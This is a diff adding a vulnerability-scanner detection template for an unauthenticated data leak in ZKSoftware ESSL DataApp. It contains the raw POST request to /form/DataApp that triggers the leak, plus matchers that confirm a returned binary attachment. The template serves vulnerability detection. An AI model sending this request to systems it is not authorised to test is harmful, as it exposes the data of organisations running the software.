@@ -1,0 +1,35 @@
+id: zksoftware-essl-dataapp-unauth-leak
+info:
+  name: ZKSoftware ESSL DataApp Unauthenticated Data Leak
+  author: sharecast
+  severity: critical
+  description: |
+    Detects unauthenticated data leakage in ZKSoftware ESSL DataApp via the /form/DataApp endpoint.
+  reference:
+    - https://nosec.org/home/detail/3032.html
+http:
+  - raw:
+      - |
+        POST /form/DataApp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        style=1
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/binary"
+      - type: word
+        part: header
+        words:
+          - "attachment"
+      - type: word
+        part: body
+        words:
+          - "ZK"
